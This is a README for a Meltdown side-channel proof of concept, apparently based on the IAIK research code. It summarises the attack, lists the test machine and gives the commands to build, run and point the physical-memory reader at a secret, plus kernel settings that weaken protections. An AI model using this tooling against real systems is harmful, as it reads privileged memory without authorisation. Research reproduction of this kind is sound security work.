# Meltdown Attack Implementation code on x86

Meltdown attack is proposed by Moritz Lipp et al. in their research paper entitled, Meltdown: Reading Kernel Memory from User Space at 27th {USENIX} Security Symposium ({USENIX} Security 18) in 2018. This attack exploits un-authorized access to kernal space memery and allow adversaries to read complete physical memory at user level. This attack exploit out-of-order executions and with combination of cache-based side channel attack (Flush+Reload) as covert channel able to read kernal memory without necessary permissions. This implmenentation use same code as available at (https://github.com/IAIK/meltdown).

## Machine Specifications:

Intel Core i7_4770 CPU @ 3.40GHz
CPU: 8, L1d Cache: 32KB, L1i Cache : 32KB L2 Cache : 256KB, L3 Cache : 8192 KB
Ubuntu 16.04.3 LTS, Kernel: Linux 4.10.0-28-generic

## Attack

Compile attack using
```
    make
```

### 1. Test

```
    taskset 0x1 ./test
```

### 2. Attack - Reading physical memory

Run secret application which contian some secret data.

```
    sudo ./secret
```

Copy the physical location of secret data and run adversary.

```
    taskset 0x1 ./physical_reader 0x390fff400
```

## Note

This attack requires KASLR disabled, if KASLR is enabled, this attack will not work. To disable KASLR use 'nopti' and 'nokaslr' as kernal parameters.
